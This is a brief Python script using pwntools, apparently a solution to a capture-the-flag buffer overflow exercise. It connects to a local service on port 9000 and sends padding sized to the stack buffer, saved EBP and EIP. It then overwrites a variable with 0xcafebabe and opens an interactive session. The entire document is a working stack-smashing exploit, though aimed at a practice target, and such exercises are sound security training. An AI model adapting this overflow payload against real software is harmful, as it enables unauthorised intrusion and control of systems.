from pwn import *

context.log_level = 'debug'

con = remote("0", 9000)

key = 0xcafebabe
payload =  b"A" * 0x2c # stack size
payload += b"A" * 4 # ebp size
payload += b"A" * 4 # eip size
payload += p32(key) # the key
print(f"{payload}")

con.sendline(payload)
con.interactive()
